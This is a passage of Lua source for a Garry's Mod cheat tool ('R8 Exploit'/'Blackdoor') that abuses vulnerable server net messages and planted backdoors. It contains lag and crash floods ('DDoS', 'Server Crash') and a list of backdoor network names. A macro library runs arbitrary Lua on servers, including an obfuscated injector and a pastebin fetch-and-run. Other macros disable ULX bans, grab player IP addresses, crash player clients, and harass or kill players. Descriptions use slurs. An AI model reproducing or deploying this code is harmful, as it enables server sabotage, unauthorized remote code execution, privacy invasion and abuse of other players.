	    addExploit("287", "Disable all bitcoin miners", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
	                net.Start("bitcoins_request_turn_off")
	                net.WriteEntity(v)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("NET_AM_MakePotion")

	if (status) then
	    ECPrint("Found Exploit: Lagger #43 [NET_AM_MakePotion]")

	    addExploit("288", "Lagger #43", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger43", 0, 0, function()
	            for i = 1, 2000 do
	                net.Start('NET_AM_MakePotion', true)
	                net.WriteEntity(LocalPlayer())
	                net.WriteInt(9999999999999999999999999999999999999999999999999999999999, 8)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("minigun_drones_switch")

	if (status) then
	    ECPrint("Found Exploit: Lagger #44 [minigun_drones_switch]")

	    addExploit("289", "Lagger #44", "discovered by Solly", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger44", 0.2, 0, function()
	            for i = 1, 2200 do
	                net.Start("minigun_drones_switch", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("CW20_PRESET_LOAD")

	if (status) then
	    ECPrint("Found Exploit: Lagger #45 (u need cw2 weapon in hand) [CW20_PRESET_LOAD]")

	    addExploit("290", "Lagger #45", "(u need cw2 weapon in hand),discovered by Solly", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger45", 0.2, 0, function()
	            if (LocalPlayer():GetActiveWeapon():GetClass():find("cw")) then
	                for i = 1, 2200 do
	                    net.Start("CW20_PRESET_LOAD", true)
	                    net.SendToServer()
	                end
	            end
	        end)
	    end)
	end

	status = ValidNetString("SBP_addtime")

	if (status) then
	    ECPrint("Found Exploit: Lagger #46 [SBP_addtime]")

	    addExploit("291", "Lagger #46", "discovered by Solly", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger46", 0.3, 0, function()
	            for i = 1, 2200 do
	                net.Start("SBP_addtime", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("NetData")

	if (status) then
	    ECPrint("Found Exploit: Outfit player nouser [NetData]")

	    addExploit("292", "Outfit player nouser", "Just noise players near u (discovered by Solly)", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("NetData")
	            net.WriteString("OF")
	            net.WriteUInt(4, 8)
	            net.WriteData(math.random(100000, 9999999) .. ",sis.mdl", 30)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("StackGhost")

	if (status) then
	    ECPrint("Found Exploit: DDoS #1")

	    addExploit("294", "DDoS #1", "Creates lags on server [StackGhost]", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("DDoS", 0.02, 0, function()
	            for i = 1, 2000 do
	                net.Start("StackGhost", true)
	                net.WriteInt(69, 32)
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("pac_submit")

	if (status) then
	    ECPrint("Found Exploit: DDoS #2")

	    addExploit("295", "DDoS #2", "Creates lags on server [pac_sumbit]", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        -----------------------------------
	        timer.Create("DDoS2", 0.02, 0, function()
	            for i = 1, 1000 do
	                Disco.NetStart("pac_submit")
	                net.SendToServer()
	            end
	        end)
	    end)
	    ----------------------------------
	end

	status = ValidNetString("RequestMAPSize")

	if (status) then
	    ECPrint("Found Exploit: 1tap server [MapSize]")

	    addExploit("296", "1tap server [MapSize]", "-1 server", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        -----------------------------------
	        timer.Create("lagger10", 0, 0, function()
	            for i = 1, 400 do
	                net.Start("RequestMAPSize")
	                net.SendToServer()
	            end
	        end)
	    end)
	    ----------------------------------
	end

	status = ValidNetString("properties")

	if (status) then
	    ECPrint("Found Exploit: Weapon Strip")

	    addExploit("297", "Weapon Strip", "-weapon", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        -----------------------------------
	        for k, v in pairs(player.GetAll()) do
	            if v:IsPlayer() then
	                for k, v in pairs(v:GetWeapons()) do
	                    net.Start("properties")
	                    net.WriteString("remove", 32)
	                    net.WriteEntity(v)
	                    net.SendToServer()
	                end
	            end
	        end
	    end)
	    ----------------------------------
	end

	status = ValidNetString("start_wd_emp")

	if (status) then
	    ECPrint("Found Exploit: Hack Keypad")

	    addExploit("298", "HackKeypad", "Hack Keypad", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        -----------------------------------
	        net.Start('start_wd_emp')
	        net.SendToServer()
	    end)
	    ----------------------------------
	end

	status = ValidNetString("pac.net.TouchFlexes.ClientNotify")

	if (status) then
	    ECPrint("Found Exploit: Server Crash")

	    addExploit("299", "Server Crash", " ", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        -----------------------------------
	        timer.Create("crasher2", 0, 0, function()
	            for i = 1, 400 do
	                net.Start("pac.net.TouchFlexes.ClientNotify")
	                net.WriteInt(9999999999999999999999999999999999999999999999999999999999999999999999, 13)
	                net.SendToServer()
	            end
	        end)
	    end)
	    ----------------------------------
	end

	status = ValidNetString("ItemStoreDrop")

	if (status) then
	    ECPrint("Found Exploit: DDoS item")

	    addExploit("300", "DDoS item", " ", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        -----------------------------------
	        timer.Create("lagger7", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("ItemStoreDrop")
	                net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
	                net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
	                net.SendToServer()
	            end
	        end)
	    end)
	    ----------------------------------
	end

	status = ValidNetString("TFA_Attachment_RequestAll")

	if (status) then
	    ECPrint("Found Exploit: TFA LAGGER")

	    addExploit("301", "TFA LAGGER", " ", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        -----------------------------------
	        timer.Create("lagger20", 0.02, 0, function()
	            for i = 1, 4400 do
	                net.Start("TFA_Attachment_RequestAll", true)
	                net.SendToServer()
	            end
	        end)
	    end)
	    ----------------------------------
	end

	status = ValidNetString("ts_buytitle")

	if (status) then
	    ECPrint("Found Exploit: Lagger #47 [ts_buytitle]")

	    addExploit("302", "Lagger #47", "an exploit in the addon 'TitleStore'", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger47", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("ts_buytitle", true)
	                net.WriteTable({})
	                net.WriteTable({})
	                net.WriteTable({})
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("SBP_addtime")

	if (status) then
	    ECPrint("Found Exploit: XP Booster [SBP_addtime]")

	    addExploit("293", "XP Booster", "discovered by Solly", function()
	        inputFrameExists = true
	        inputFrame = vgui.Create("DFrame")
	        inputFrame:SetTitle("Enter the number")
	        inputFrame:SetSize(400, 75)
	        inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230)
	        inputFrame:SetDraggable(false)
	        inputFrame:ShowCloseButton(true)
	        inputFrame:MakePopup()

	        inputFrame.Paint = function(self, w, h)
	            draw.RoundedBox(5, 0, 0, w, h, Color(30, 30, 30))
	        end

	        local TextEntry = vgui.Create("DTextEntry", inputFrame)
	        TextEntry:SetSize(380, 30)
	        TextEntry:SetPos(inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2)
	        TextEntry:SetText("100")

	        TextEntry.OnEnter = function(self)
	            surface.PlaySound("garrysmod/ui_click.wav")

	            timer.Create("ofn", 0.2, 0, function()
	                for i = 1, tonumber(self:GetText()) do
	                    net.Start("SBP_addtime")
	                    net.SendToServer()
	                end

	                inputFrame:SetVisible(false)
	            end)
	        end
	    end)
	end

	--/////////////////////////////////////////// [OTHER] /////////////////////////////////////////////
	status = ValidNetString("EnterpriseWithdraw")

	if (status) then
	    ECPrint("Found Exploit: ENTERPRISE FOUND! [EnterpriseWithdraw]")

	    addExploit("1337", "ENTERPRISE FOUND!", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("EnterpriseWithdraw")
	        net.WriteInt(100, 32)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("SetPermaKnife")

	if (status) then
	    ECPrint("Found Exploit: PERMA KNIFE FOUND [SetPermaKnife]")

	    addExploit("1337", "PERMA KNIFE FOUND", "PERMA KNIFE FOUND", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	    end)
	    --[[
	function cockSucker(ply,cmd,args,argStr)
	local ply = LocalPlayer()

	net.Start( "SetPermaKnife" )
	  net.WriteString( string.TrimRight(argStr,".lua") )
	net.SendToServer()
	end

	concommand.Add("gibe_weapon",cockSucker)
	]]
	end
	----------------------------------------------------------------------------------
	--   for k, v in pairs(player.GetAll()) do
	--   for k, v in pairs(ents.GetAll()) do
	----------------------------------------------------------------------------------
	--   if !timer.Exists("lagger") then
	--   timer.Create("lagger", 0, 0, function()
	--   for i = 1, 1000 do
	-----------------------------
	-- 9999999999999999999999999999999999999999999999999999999999
	-- 0xFFFFFFF
	--------------------------------------------------------------------------------------------------
	--------------------------------------------------------------------------------------------------
	--------------------------------------------------------------------------------------------------

end
concommand.Add('R8_Exploit', function()
    R8_Menu()
end)


local BD = {}
netKey = "memeDoor"
BackdoorsFound = 0

function ValidNetString(str)
    local status, error = pcall(net.Start, str)

    return status
end

BackDoor_net = {
    {
        NetWork = "Sandbox_ArmDupe"
    },
    {
        NetWork = "Sbox_darkrp"
    },
    {
        NetWork = "Sbox_itemstore"
    },
    {
        NetWork = "Ulib_Message"
    },
    {
        NetWork = "ULogs_Info"
    },
    {
        NetWork = "ITEM"
    },
    {
        NetWork = "R8"
    },
    {
        NetWork = "fix"
    },
    {
        NetWork = "Fix_Keypads"
    },
    {
        NetWork = "Remove_Exploiters"
    },
    {
        NetWork = "noclipcloakaesp_chat_text"
    },
    {
        NetWork = "_Defqon"
    },
    {
        NetWork = "_CAC_ReadMemory",
"nostrip"
    },
    {
        NetWork = "nocheat"
    },
    {
        NetWork = "LickMeOut"
    },
    {
        NetWork = "ULX_QUERY2"
    },
    {
        NetWork = "ULXQUERY2"
    },
    {
        NetWork = "MoonMan"
    },
    {
        NetWork = "Im_SOCool"
    },
    {
        NetWork = "Sandbox_GayParty"
    },
    {
        NetWork = "DarkRP_UTF8"
    },
    {
        NetWork = "oldNetReadData"
    },
    {
        NetWork = "memeDoor"
    },
    {
        NetWork = "BackDoor"
    },
    {
        NetWork = "OdiumBackDoor"
    },
    {
        NetWork = "SessionBackdoor"
    },
    {
        NetWork = "DarkRP_AdminWeapons"
    },
    {
        NetWork = "cucked"
    },
    {
        NetWork = "NoNerks"
    },
    {
        NetWork = "kek"
    },
    {
        NetWork = "ZimbaBackDoor"
    },
    {
        NetWork = "something"
    },
    {
        NetWork = "random"
    },
    {
        NetWork = "strip0"
    },
    {
        NetWork = "fellosnake"
    },
    {
        NetWork = "enablevac"
    },
    {
        NetWork = "idk"
    },
    {
        NetWork = "c"
    },
    {
        NetWork = "killserver"
    },
    {
        NetWork = "fuckserver"
    },
    {
        NetWork = "cvaraccess"
    },
    {
        NetWork = "rcon"
    },
    {
        NetWork = "rconadmin"
    },
    {
        NetWork = "web"
    },
    {
        NetWork = "jesuslebg"
    },
    {
        NetWork = "zilnix"
    },
    {
        NetWork = "ГћГ ?D)в—"
    },
    {
        NetWork = "disablebackdoor"
    },
    {
        NetWork = "kill"
    },
    {
        NetWork = "DefqonBackdoor"
    }
}

function checkbackdoors()
    for k, v in pairs(BackDoor_net) do
        if (ValidNetString(v.NetWork)) then
            BackdoorsFound = 1 + BackdoorsFound
            chat.AddText(Color(0, 0, 0, 125), "[R8]", Color(255, 255, 255), " Found Backdoor! - " .. v.NetWork)
            v.NetWork = backdoor
        end
    end
end

BD.Backdoors = BD.Backdoors or {}
BD.CurrentBackdoor = "Generic"

for k, v in pairs(BackDoor_net) do
    if (ValidNetString(v.NetWork)) then
        BD.BackdoorTypes = {
            ["Generic"] = {
                ["Code"] = "util.AddNetworkString( " .. v.NetWork .. " ) net.Receive( " .. v.NetWork .. ", function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
                ["Netkey"] = v.NetWork
            }
        }
    end
end

checkbackdoors()
local netsss = net.Start

function BD.IsMessagePooled(netmessage)
    local netfunc = netsss

    return status
end

local net = net
local ctxt = chat.AddText

function BD.ChatText(message, col)
    ctxt(Color(195, 205, 255, 255), "[Blackdoor] ", col, message)
end

function BD.PingBackDoors()
    local bds = {}

    for k, v in pairs(BackDoor_net) do
        if BD.IsMessagePooled(tostring(v.NetWork)) then
            bds[k] = true
        end
    end

    return bds
end

concommand.Add("bd_refresh_backdoors", function()
    BD.Backdoors = BD.PingBackDoors()
end)

function BD.BackdoorActive()
    return table.Count(BD.Backdoors) > 0
end

BD.BDMacros = {
    ["Artillery Strike"] = {
        ["Type"] = 1,
        ["Code"] = [[if !bombstrike then

hook.Add("Think", "lulz_bombstrike", function() 

local explode = ents.Create( "env_explosion" ) 

local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))

local trc = {}

trc.start = ps

trc.endpos = ps + Vector( 0, 0, -99999)

local tr = util.TraceLine(trc)

if !tr.Hit then return end

explode:SetPos( tr.HitPos ) 

explode:Spawn() 

explode:SetKeyValue( "iMagnitude", "400" ) 

explode:Fire( "Explode", 0, 0 ) 

end)

bombstrike = true

else

hook.Remove("Think", "lulz_bombstrike")

bombstrike = false

end]],
        ["Desc"] = "Explode the shit out of everything"
    },
    ["@ Inject SendLua Interface"] = {
        ["Type"] = 1,
        ["Code"] = [[

local вЂЄ = _G local вЂЄвЂЄ = вЂЄ['\115\116\114\105\110\103'] local вЂЄвЂЄвЂЄ = вЂЄ['\98\105\116']['\98\120\111\114'] local function вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ(вЂЄвЂЄвЂЄвЂЄ) if вЂЄвЂЄ['\108\101\110'](вЂЄвЂЄвЂЄвЂЄ) == 0 then return вЂЄвЂЄвЂЄвЂЄ end local вЂЄвЂЄвЂЄвЂЄвЂЄ = '' for _ in вЂЄвЂЄ['\103\109\97\116\99\104'](вЂЄвЂЄвЂЄвЂЄ,'\46\46') do вЂЄвЂЄвЂЄвЂЄвЂЄ=вЂЄвЂЄвЂЄвЂЄвЂЄ..вЂЄвЂЄ['\99\104\97\114'](вЂЄвЂЄвЂЄ(вЂЄ["\116\111\110\117\109\98\101\114"](_,16),25)) end return вЂЄвЂЄвЂЄвЂЄвЂЄ end вЂЄ[вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'6c6d7075'][вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'587d7d577c6d6e766b724a6d6b70777e'](вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'4b21')вЂЄ[вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'777c6d'][вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'4b7c7a7c706f7c'](вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'4b21',function ()local falseвЂЄ=вЂЄ[вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'5a76746970757c4a6d6b70777e'](вЂЄ[вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'777c6d'][вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'4b7c787d4a6d6b70777e'](),вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'556c785a747d',false )if вЂЄ[вЂЄвЂЄвЂЄвЂЄвЂЄвЂЄвЂЄ'706a7f6c777a6d707677'](falseвЂЄ)then falseвЂЄ()end end )

        ]],
        ["Desc"] = "You need this to use certain macros"
    },
    ["Announce centre screen"] = {
        ["Type"] = 1,
        ["Code"] = [[for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, @1 ) end]],
        ["Desc"] = "Make an announcement in the centre of everybodys screen",
        ["NeedsParameters"] = 1
    },
    ["Rainbow chat spam"] = {
        ["Type"] = 1,
        ["Code"] = [[

        if !timer.Exists( "lulz_chatspam" ) then

            timer.Create( "lulz_chatspam", 0.5, 0, function() BDSendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )' ) end)

        else

            timer.Remove( "lulz_chatspam" )

        end]],
        ["Desc"] = "Spam rainbow chat for all players with the 1st parameter as the text",
        ["NeedsParameters"] = 1
    },
    ["Rainbow chat spam (Turbo)"] = {
        ["Type"] = 1,
        ["Code"] = [[

        if !timer.Exists( "lulz_chatspam" ) then

            timer.Create( "lulz_chatspam", 0.01, 0, function() BDSendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )' ) end)

        else

            timer.Remove( "lulz_chatspam" )

        end]],
        ["Desc"] = "Spam rainbow chat for all players with the 1st parameter as the text",
        ["NeedsParameters"] = 1
    },
    ["Unlock all doors"] = {
        ["Type"] = 1,
        ["Code"] = [[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]],
        ["Desc"] = ""
    },
    ["Toggle all doors"] = {
        ["Type"] = 1,
        ["Code"] = [[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end]],
        ["Desc"] = ""
    },
    ["Broken Glass Symphony"] = {
        ["Type"] = 1,
        ["Code"] = [[

    if !timer.Exists( "A true masterpiece" ) then

        timer.Create( "A true masterpiece", 0.2, 0, function() 

            for _, p in pairs(player.GetAll()) do

                p:EmitSound( "physics/glass/glass_largesheet_break"..math.random(1,3)..".wav", 100, math.random( 40, 180 ) )

            end

        end)

    else

        timer.Remove( "A true masterpiece" )

    end]],
        ["Desc"] = "Beethoven's last hidden symphony, only rediscovered in 2017"
    },
    ["Yeah Baby"] = {
        ["Type"] = 1,
        ["Code"] = [[

        if !timer.Exists( "porn" ) then

        timer.Create( "porn", 0.3, 0, function() 

            for _, p in pairs(player.GetAll()) do

                p:EmitSound( "vo/npc/female01/yeah02.wav", 100, math.random( 90, 120 ) )

            end

        end)

        else

            timer.Remove( "porn" )

        end]],
        ["Desc"] = "YEAH BABY YEAH"
    },
    ["Street War"] = {
        ["Type"] = 1,
        ["Code"] = [[

        if !timer.Exists( "cwar" ) then

        timer.Create( "cwar", 1, 0, function() 

            for _, p in pairs(player.GetAll()) do

                p:EmitSound( "ambient/levels/streetwar/city_battle"..math.random( 1, 19 )..".wav", 100, math.random( 90, 120 ) )

            end

        end)

        else

            timer.Remove( "cwar" )

        end]],
        ["Desc"] = "For when you need more dakka"
    },
    ["Earthquake"] = {
        ["Type"] = 1,
        ["Code"] = [[

        if !timer.Exists( "earthquake" ) then

        timer.Create( "earthquake", 0.5, 500, function() 

            for _, p in pairs(player.GetAll()) do

                p:SetPos( p:GetPos() + Vector( 0, 0, 1 ) )

                p:SetVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) )

                util.ScreenShake( p:GetPos(), 20, 1, 1, 100 )

                p:EmitSound( "ambient/explosions/exp1.wav", 100, math.random( 60, 100 ) )

            end



            for _, e in pairs(ents.GetAll()) do

                if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) ) end

            end





        end)

        else

            timer.Remove( "earthquake" )

        end]],
        ["Desc"] = "For when you need more dakka"
    },
    ["Explode all vehicles"] = {
        ["Type"] = 1,
        ["Code"] = [[for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then 

        local explo = ents.Create("env_explosion")

        explo:SetPos(v:GetPos())

        explo:SetKeyValue("iMagnitude", "300")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        end

        end]],
        ["Desc"] = ""
    },
    ["RCON command"] = {
        ["Type"] = 1,
        ["Code"] = [[game.ConsoleCommand( @1.."\n" )]],
        ["Desc"] = "Like having rcon access without actually having rcon access"
    },
    ["Lua run"] = {
        ["Type"] = 1,
        ["Code"] = [[@1]],
        ["Desc"] = "For running your dank luas"
    },
    ["Lua run from pastebin"] = {
        ["Type"] = 1,
        ["Code"] = [[http.Fetch( "@1", function( b, l, h, c ) RunString( b ) end, function() end )]],
        ["Desc"] = "Fetch and run code from a pastebin link ( remember to use raw you stupid faggot eg. https://pastebin.com/raw/fHeygLt9 )"
    },
    ["Destroy ULX Ban/Kick"] = {
        ["Type"] = 1,
        ["Code"] = [[ULib.Ban = function() return false end

        ULib.addBan = function() return end

        ULib.kick = function() return end]],
        ["Desc"] = "Completely break ulx ban and ulx kick so you can't be locked out of the server"
    },
    ------------------------ player targeted macros ------------------------
    ["Kill player"] = {
        ["Type"] = 2, -- 1 = indiscriminate, 2= targeted, 3 = dangerous
        ["Code"] = [[v:Kill()]],
        ["Desc"] = ""
    },
    ["Fumble player"] = {
        ["Type"] = 2, -- 1 = indiscriminate, 2= targeted, 3 = dangerous
        ["Code"] = [[v:DropWeapon( v:GetActiveWeapon() )]],
        ["Desc"] = "Knocks their current weapon out of their hand"
    },
    ["Strip weapons"] = {
        ["Type"] = 2,
        ["Code"] = [[v:StripWeapons()]],
        ["Desc"] = ""
    },
    ["Rocket"] = {
        ["Type"] = 2,
        ["Code"] = [[v:SetVelocity( Vector(0, 0, 9000) )]],
        ["Desc"] = "Sends them flying up into the air"
    },
    ["Rocket (Spastic)"] = {
        ["Type"] = 2,
        ["Code"] = [[v:SetVelocity( Vector(math.random( -9000, 9000), math.random( -9000, 9000), 9000) )]],
        ["Desc"] = "HOLY SHIIIIIIIIIIIT"
    },
    ["Change model"] = {
        ["Type"] = 2,
        ["Code"] = [[v:SetModel( @1 )]],
        ["Desc"] = "Set their player model to the specified string (1st paremeter)",
        ["NeedsParameters"] = 1
    },
    ["Set health + armor"] = {
        ["Type"] = 2,
        ["Code"] = [[v:SetHealth( @1 ) v:SetArmor( @2 ) ]],
        ["Desc"] = "Sets their health (1st paremeter) and armor (2nd paremeter)",
        ["NeedsParameters"] = 2
    },
    ["Ear rape"] = {
        ["Type"] = 2,
        ["Code"] = [[

        local snd = {

            [1] = "npc/stalker/go_alert2a.wav",

            [2] = "vo/npc/male01/question06.wav",

            [3] = "ambient/energy/zap1.wav",

            [4] = "weapons/knife/knife_stBD.wav",

            [5] = "vo/ravenholm/madlaugh04.wav",

            [6] = "npc/antlion_guard/antlion_guard_die1.wav",

            [7] = "vo/breencast/br_collaboration01.wav,"

        }

        v:EmitSound( snd[tonumber(@1)], 100, 100 )

        ]],
        ["Desc"] = "Make them emit a sound (1st paremeter is a number 1-7)",
        ["NeedsParameters"] = 1
    },
    ["Ear rape (from internet)"] = {
        ["Type"] = 2,
        ["Code"] = [[

        BDSendLua( v, 'if soundrape then soundrape:Remove() soundrape = nil return end soundrape = vgui.Create( "DFrame" ) soundrape:SetSize( 1, 1 ) local html = vgui.Create( "HTML", soundrape ) html:OpenURL( @1 )' )

        ]],
        ["Desc"] = "Make them hear a sound from a URL (1st paremeter).  Sending a new sound will stop the previous one.  Send an invalid url to stop all sounds entirely on their client",
        ["NeedsParameters"] = 1
    },
    ["Eye rape (from internet)"] = {
        ["Type"] = 2,
        ["Code"] = [[ 

        BDSendLua( v, 'if bdeyerape then bdeyerape:Remove() bdeyerape = nil return end bdeyerape = vgui.Create( "DFrame" )bdeyerape:SetDraggable( false )bdeyerape:SetSize( ScrW(), ScrH() )bdeyerape:SetTitle( "" )bdeyerape:ShowCloseButton( false )local html = vgui.Create( "HTML", bdeyerape )html:Dock( FILL )html:OpenURL( @1 )' )

        ]],
        ["Desc"] = "Make them see a full screen, unclosable panel from a URL (1st paremeter).  Sending a new url will stop the previous one.  Send an invalid url to clear their view entirely",
        ["NeedsParameters"] = 1
    },
    ["Rave Mode"] = {
        ["Type"] = 2,
        ["Code"] = [[ 

            BDSendLua( v, 'if hook.GetTable().HUDPaint.drugznigga then hook.Remove( "HUDPaint", "drugznigga" ) else hook.Add( "HUDPaint", "drugznigga", function() local cin = math.sin( CurTime() * 10 ) * 255 surface.SetDrawColor( Color( cin, -cin, cin, 100 ) ) surface.DrawRect( 0, 0, ScrW(), ScrH() ) end) end' )

        ]],
        ["Desc"] = "Make them loosen up and join the party"
    },
    ["Rave Music"] = {
        ["Type"] = 2,
        ["Code"] = [[ 

            BDSendLua( v, 'surface.PlaySound( "music/hl1_song25_remix3.mp3" )' )

        ]],
        ["Desc"] = "DOOF DOOF NIGGA"
    },
    ["Whisper"] = {
        ["Type"] = 2,
        ["Code"] = [[v:ChatPrint( @1 )]],
        ["Desc"] = "Anonymously whisper text into their chatbox (1st paremeter)",
        ["NeedsParameters"] = 1
    },
    ["Whisper (advanced)"] = {
        ["Type"] = 2,
        ["Code"] = [[

        BDSendLua( v, 'chat.AddText( Color( @2, @3, @4 ), @1 )' )

        ]],
        ["Desc"] = "Anonymously whisper coloured text into their chatbox (1st paremeter = text, 2nd = r, 3rd = g, 4th = b)",
        ["NeedsParameters"] = 1
    },
    ["Ignite player"] = {
        ["Type"] = 2,
        ["Code"] = [[v:Ignite( 30 )]],
        ["Desc"] = "Ignite players for 30 seconds, spam repeatedly to refresh the duration"
    },
    ["Toggle godmode"] = {
        ["Type"] = 2,
        ["Code"] = [[if v:HasGodMode() then v:GodDisable() else v:GodEnable() end]],
        ["Desc"] = ""
    },
    ["Crash their gmod"] = {
        ["Type"] = 2,
        ["Code"] = [[v:SendLua("function fag() return fag() end fag()")]],
        ["Desc"] = "Instantly freezes their game solid, the only way to fix it is ctrl-alt-delete or a computer restart"
    },
    ["Toggle serverside speedhack"] = {
        ["Type"] = 2,
        ["Code"] = [[if !v.Sanic then v:SetRunSpeed( 1200 ) v:SetWalkSpeed(800) v.Sanic = true else v:SetRunSpeed( 240 ) v:SetWalkSpeed( 160 ) v.Sanic = false end]],
        ["Desc"] = "GOTTA GO FAST"
    },
    ["Freeze/Unfreeze player"] = {
        ["Type"] = 2,
        ["Code"] = [[v:Freeze( !v:IsFrozen() )]],
        ["Desc"] = ""
    },
    ["Force say"] = {
        ["Type"] = 2,
        ["Code"] = [[v:Say(@1)]],
        ["Desc"] = "Forces them to say the specified string in chat (first parameter)",
        ["NeedsParameters"] = 1
    },
    ["Force concommand"] = {
        ["Type"] = 2,
        ["Code"] = [[v:ConCommand(@1)]],
        ["Desc"] = "Forces them to run the specified console command (first parameter)",
        ["NeedsParameters"] = 1
    },
    ["Grab IP"] = {
        ["Type"] = 2,
        ["Code"] = [[ for _, p in pairs(player.GetAll()) do if %LP then p:ChatPrint( v:Nick().." : "..v:IPAddress() ) end end]],
        ["Desc"] = "Prints their IP Address to your console"
    },
    ["DarkRP add/remove money"] = {
        ["Type"] = 2,
        ["Code"] = [[v:addMoney(@1)]],
        ["Desc"] = "Adds money to their wallet (first parameter) remember that you can use negative numbers to subtract money",
        ["NeedsParameters"] = 1
    },
    ["DarkRP force job"] = {
        ["Type"] = 2,
        ["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:changeTeam(i, true, true) end end]],
        ["Desc"] = "Change their team to the specified job (1st parameter = job name, does not require capitalization)",
        ["NeedsParameters"] = 1
    },
    ["Force team switch"] = {
        ["Type"] = 2,
        ["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:SetTeam( i ) end end]],
        ["Desc"] = "Change their team to the specified team name (1st parameter)",
        ["NeedsParameters"] = 1
    },
    ["Noclip player"] = {
        ["Type"] = 2,
        ["Code"] = [[if v:GetMoveType() != MOVETYPE_NOCLIP then v:SetMoveType(MOVETYPE_NOCLIP) else v:SetMoveType(MOVETYPE_WALK) end]],
        ["Desc"] = "Toggles noclip on the specified players"
    },
    ["Give weapon to player"] = {
        ["Type"] = 2,
        ["Code"] = [[v:Give( @1 )]],
        ["Desc"] = "Gives this player a weapon (first parameter)",
        ["NeedsParameters"] = 1
    },
    ["Give ammo to player"] = {
        ["Type"] = 2,
        ["Code"] = [[v:GiveAmmo( @1, @2, false )]],
        ["Desc"] = "Gives this player some ammo (first parameter = amount of ammo, secound parameter = ammo type)",
        ["NeedsParameters"] = 2
    },
    ["Teleport (them to your cursor)"] = {
        ["Type"] = 2,
        ["Code"] = [[

            local tp = false

            local tpos

            for _, p in pairs(player.GetAll()) do if %LP then tpos = p:GetEyeTraceNoCursor().HitPos tp = true end end

            if tp then v:SetPos( tpos ) end

        ]],
        ["Desc"] = "Teleports the selected players to your cursor location, not recommended for more than 1 person at once"
    },
    ["Teleport (you to them)"] = {
        ["Type"] = 2,
        ["Code"] = [[

            local tp = false

            local tpos = v:GetPos() + Vector( 32, 0, 10)

